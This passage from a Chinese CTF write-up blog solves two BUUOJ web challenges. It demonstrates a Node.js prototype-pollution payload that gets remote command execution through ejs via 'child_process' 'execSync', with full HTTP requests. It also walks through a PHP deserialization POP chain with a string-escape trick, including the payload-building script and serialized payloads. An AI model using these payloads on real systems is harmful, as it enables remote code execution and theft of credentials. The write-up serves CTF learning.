href=\"https://www.jianshu.com/p/6e623e9debe3\">这里</a>、<a href=\"https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/\">这里</a>和<a href=\"https://xz.aliyun.com/t/7184#toc-3\">这里</a>。简单来说，JavaScript里绝大部分对象继承了Object对象，例如String对象就继承于String类（function等同于class），又继承于Object对象。那么String对象的原型就是String类，如下图所示：</p>\r\n<div class=\"mermaid\">\ngraph LR\nA[&quot;Object()&quot;]--&gt;|Prototype|B[&quot;function String()&quot;]\nB--&gt;|Prototype|C[&quot;123&quot;]\n</div>\r\n<p>这条继承链就叫做原型链。我们如果在function String()里添加方法或属性，继承它的'123'会添加相同的方法属性。而JavaScript在访问某对象属性或方法时是从原型链起始Object()开始查找，直到最后的目标。因此假设我们为Object()添加了个toUppercase()方法，最后'123'.toUppercase()就会优先调用Object()的toUppercase()，这样toUppercase()就被我们污染了，这种攻击方法就叫原型链污染。注意一点，原型链污染的时候我们需要传入JSON数据，即发包的Content-type要变成application/json，否则__proto__不会覆盖。</p>\r\n<p>回到题目，下面的问题是我们的输入怎样污染呢？注意到在route('/')的时候有点东西： <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">router.get(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!req.session.user) &#123;</span><br><span class=\"line\">        res.redirect(<span class=\"string\">&#x27;/login&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res.outputFunctionName = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">    res.render(<span class=\"string\">&#x27;index&#x27;</span>, data = &#123;<span class=\"string\">&#x27;user&#x27;</span>: req.session.user.user&#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure> 为什么多出来个outputFunctionName？本题的渲染引擎用的ejs，貌似在刚才的参考文章里提到可以造成RCE。</p>\r\n<p>所以，我们抄一下RCE的Payload<code>a; return global.process.mainModule.constructor._load('child_process').execSync('whoami');</code>。发包吧： <figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/action</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 146</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://54830c3c-4435-4ff0-814f-a9cfc97ec6d0.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: _ga=GA1.2.744187123.1582874453;  session=s%3AuujbI4q6GPRCu7MQpsxrcvFqt0tTzzAV.jGfKfFz5gfEczv2Yw1LCl1nHqwMEsY2k6Zup91j0X88</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;lua&quot;:&quot;aaa&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;); //&quot;&#125;&#125;</span><br></pre></td></tr></table></figure> 提交后刷新页面即可得到flag。</p>\r\n\n    <div id=\"aplayer-zbVpSGMt\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"4164331\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{3fa89b5f-528d-434b-9ada-e93a864b2969}</p>\r\n","categories":["Writeups"],"tags":["Web","NodeJS","原型链污染"]},{"title":"BUUOJ刷题-Web-GYCTF2020-Easyphp","url":"/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>GYCTF 2020的BabyPHP（题目上错名字了）。</p>\r\n<p>开题让登陆，随手试了一下www.zip发现还真有源码。。。</p>\r\n<p>index.php没啥，限制后缀名为.php，LFI没用处。login.php Ban了一堆关键字 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;username&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;</span>, $_POST[<span class=\"string\">&#x27;username&#x27;</span>]))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;</span>, $_POST[<span class=\"string\">&#x27;password&#x27;</span>]))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">&quot;Damn you, hacker!&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$user-&gt;login();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<a id=\"more\"></a>\r\n<p>login()函数来自lib.php。update.php里实例化了一个User()类，并update()。如果$_SESSION['login']===1就输出flag。</p>\r\n<div class=\"note warning\"><p>一个大坑在于，update.php里判断没有登录后会继续执行$user()-&gt;update()，开始的时候没注意到这点，导致一直在想如何利用login.php传参。。。</p>\r\n</div>\r\n<p>本题重点就是lib.php了。User类的login()从POST获取username和password后执行查询，返回结果就分配SESSION。没太多搞头，但是update()里出现了unserialize()，就很有意思了：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    $Info=unserialize(<span class=\"keyword\">$this</span>-&gt;getNewinfo());</span><br><span class=\"line\">    $age=$Info-&gt;age;</span><br><span class=\"line\">    $nickname=$Info-&gt;nickname;</span><br><span class=\"line\">    $updateAction=<span class=\"keyword\">new</span> UpdateHelper($_SESSION[<span class=\"string\">&#x27;id&#x27;</span>],$Info,<span class=\"string\">&quot;update user SET age=$age,nickname=$nickname where id=&quot;</span>.$_SESSION[<span class=\"string\">&#x27;id&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"comment\">//这个功能还没有写完 先占坑</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>先反序列化getNewInfo()返回值，又调用了UpdateHelper()。getNewInfo()代码如下： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNewInfo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        $age=$_POST[<span class=\"string\">&#x27;age&#x27;</span>];</span><br><span class=\"line\">        $nickname=$_POST[<span class=\"string\">&#x27;nickname&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> safe(serialize(<span class=\"keyword\">new</span> Info($age,$nickname)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe</span>(<span class=\"params\">$parm</span>)</span>&#123;</span><br><span class=\"line\">    $array= <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;union&#x27;</span>,<span class=\"string\">&#x27;regexp&#x27;</span>,<span class=\"string\">&#x27;load&#x27;</span>,<span class=\"string\">&#x27;into&#x27;</span>,<span class=\"string\">&#x27;flag&#x27;</span>,<span class=\"string\">&#x27;file&#x27;</span>,<span class=\"string\">&#x27;insert&#x27;</span>,<span class=\"string\">&quot;&#x27;&quot;</span>,<span class=\"string\">&#x27;\\\\&#x27;</span>,<span class=\"string\">&quot;*&quot;</span>,<span class=\"string\">&quot;alter&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace($array,<span class=\"string\">&#x27;hacker&#x27;</span>,$parm);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 从POST获取age和nickname，返回safe()处理后的Info()序列化结果。safe()简单的将一堆关键字替换成'hacker'，问题很大，反序列化结果记录了每个字段的长度，强行替换会造成额外读取，我们就可以控制了。 Info类代码如下： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$age,$nickname</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age=$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname=$nickname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\">$name,$argument</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 很简单的赋值而已，当我们调用一个不存在的方法时会调用CtrlCase-&gt;login()，只有dbCtrl有login()方法还需要一个参数。 UpdateHelper类的代码如下： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$newInfo,$sql</span>)</span>&#123;</span><br><span class=\"line\">        $newInfo=unserialize($newInfo);</span><br><span class=\"line\">        $upDate=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;sql;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> UpdateHelper使用<span class=\"math inline\">\\(newInfo和\\)</span>sql构造，而在销毁时又会显示<span class=\"math inline\">\\(sql的值。正常登录后\\)</span>newInfo应该为admin用户的ID，<span class=\"math inline\">\\(sql应该是Info类，所以\\)</span>this-&gt;sql是个空。</p>\r\n<p>User类还有个__destruct方法，但是没什么卵用，file_get_contents()的结果没有输出，是个干扰用的。</p>\r\n<p>我们的目标，现在看来就剩下一个了，通过某种方法得到admin的密码，登录得到flag。而要得到flag，很明显只有通过SQL。Info类的__call方法很明显要我们调用dbCtrl的login()方法，让我们任意执行SQL语句。得到admin用户的SQL语句不难写<code>select password,username from user where username=?</code>，因为login()返回的是idResult，第一个结果。Info的__call如何别触发？回过头看User类，update()函数用到了Info类，UpdateHelper也用到了，但是这些都没有涉及到方法的调用，然后我们就看到了__toString()方法： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;nickname-&gt;update(<span class=\"keyword\">$this</span>-&gt;age);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;0-0&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> nickname哪来的？unserialize(getNewInfo())得到的，如果nickname是Info类，nickname-&gt;update就会触发Info的__call。__toString()需要一个输出字符串的地方才会被调用，而我们还有一个UpdateHelper的__destruct()，会echo <span class=\"math inline\">\\(this-&gt;sql，而在User类中UpdateHelper的调用中\\)</span>Info会被赋值成$this-&gt;sql。</p>\r\n<p>整理一下POP链，首先是new UpdateHelper()，调用__destruct()，转向new User()的__toString()，调用nickname-&gt;update()，转向new Info()的__call，最终转向new dbCtrl()带出admin的密码。如图所示： <div class=\"mermaid\">\ngraph LR\n\nid1(&quot;UpdateHelper()&quot;) --&gt;|&quot;UpdateHelper-&gt;__destruct()&quot;| id2(&quot;User()&quot;)\n\nid2 --&gt;|&quot;User-&gt;__toString()&quot;| id3(&quot;User-&gt;nickname&quot;)\n\nid3 --&gt;|&quot;User-&gt;nickname-&gt;update()&quot;| id4(&quot;Info()&quot;)\n\nid4 --&gt;|&quot;Info-&gt;__call&quot;| id5(&quot;dbCtrl()&quot;)\n\nid5 --&gt;|&quot;SQL查询&quot;| id6(&quot;admin&#39;s password MD5&quot;)\n\n</div> 写Payload： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname = <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$age, $nickname</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = $age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname = $nickname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$newInfo, $sql</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $newInfo = unserialize($newInfo);</span><br><span class=\"line\">        $upDate = <span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dbCtrl</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $hostname = <span class=\"string\">&quot;127.0.0.1&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbuser = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbpass = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $database = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">&quot;admin&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $password;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mysqli;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $token=<span class=\"string\">&quot;admin&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$db = <span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">$user = <span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$info = <span class=\"keyword\">new</span> Info(<span class=\"string\">&quot;23333&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">$updatehelper = <span class=\"keyword\">new</span> UpdateHelper(<span class=\"string\">&quot;233333&quot;</span>, <span class=\"string\">&quot;23333333&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$info-&gt;CtrlCase = $db;</span><br><span class=\"line\">$user-&gt;nickname = $info;</span><br><span class=\"line\">$user-&gt;age = <span class=\"string\">&quot;select password,id from username where username=?&quot;</span>;</span><br><span class=\"line\">$updatehelper-&gt;sql=$user;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($updatehelper);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<p>结果为<code>O:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:49:\"select password,id from username where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";s:5:\"23333\";s:8:\"nickname\";s:8:\"Tiaonmmn\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:7:\"nu1lctf\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;</code>。这个反序列化出来的是UpdateHelper类，而我们的输入点是getNewInfo()引入的Info类。怎么样能够把UpdateHelper类放到Info类中？很简单，我们布置好的UpdateHelper类在什么时候才发挥作用？调用__destruct()的时候，在正常调用User()-&gt;update()的时候Info-&gt;CtrlCase没有任何意义。所以，如果我们把Info-&gt;CtrlCase设置成UpdateHelper类怎么样？unserialize()结束后由于我们没有用到CtrlCase，所以会执行__destruct，完成我们想要的操作。 刚才的Payload应该再加两行： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname = <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$age, $nickname</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = $age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname = $nickname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$newInfo, $sql</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $newInfo = unserialize($newInfo);</span><br><span class=\"line\">        $upDate = <span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dbCtrl</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $hostname = <span class=\"string\">&quot;127.0.0.1&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbuser = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbpass = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $database = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">&quot;admin&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $password;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mysqli;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $token = <span class=\"string\">&quot;admin&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$db = <span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">$user = <span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$info = <span class=\"keyword\">new</span> Info(<span class=\"string\">&quot;23333&quot;</span>, <span class=\"string\">&quot;Tiaonmmn&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">#echo serialize($info);</span></span><br><span class=\"line\">$updatehelper = <span class=\"keyword\">new</span> UpdateHelper(<span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$info-&gt;CtrlCase = $db;</span><br><span class=\"line\">$user-&gt;nickname = $info;</span><br><span class=\"line\">$user-&gt;age = <span class=\"string\">&quot;select password,id from username where username=?&quot;</span>;</span><br><span class=\"line\">$updatehelper-&gt;sql = $user;</span><br><span class=\"line\"><span class=\"comment\">#echo serialize($updatehelper);</span></span><br><span class=\"line\">$realinfo = <span class=\"keyword\">new</span> Info(<span class=\"string\">&quot;233333&quot;</span>, <span class=\"string\">&quot;Tiaonmmn&quot;</span>);</span><br><span class=\"line\">$realinfo-&gt;CtrlCase = $updatehelper;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($realinfo);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure> <code>O:4:\"Info\":3:&#123;s:3:\"age\";s:1:\"1\";s:8:\"nickname\";s:588:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";s:5:\"23333\";s:8:\"nickname\";s:8:\"Tiaonmmn\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;&#125;\";s:8:\"CtrlCase\";N;&#125;</code>，这样就符合getNewInfo()的条件了。 还有一个问题，我们怎么传Payload？发包的时候我们只能输入age和nickname参数，CtrlCase没办法传进去。再回过头看源码，发现一直以来我们都忘记了一样东西 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNewInfo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    $age=$_POST[<span class=\"string\">&#x27;age&#x27;</span>];</span><br><span class=\"line\">    $nickname=$_POST[<span class=\"string\">&#x27;nickname&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> safe(serialize(<span class=\"keyword\">new</span> Info($age,$nickname)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> return的时候还有个safe函数呢。前面说过，safe函数只是简单地替换了字符，把相应字符串替换成hacker，那么原来序列化的字符串就有相当大的几率被破坏掉，PHP序列化时计算的字符串长度与实际字符串长度不对应，我们就可以逃逸出来插入我们想要的内容了。之前也有一道题<a href=\"https://tiaonmmn.github.io/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/\">AXB 2019 Easy serialize php</a>考这个。思路就是利用safe()函数把一个字符变成6个字符，把所有的Payload包含进去。</p>\r\n<p>最终Payload如下： <figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/update.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: _ga=GA1.2.744187123.1582874453; PHPSESSID=2bc6e7caef6bc5c3495fe91dcf0eb6c2</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span 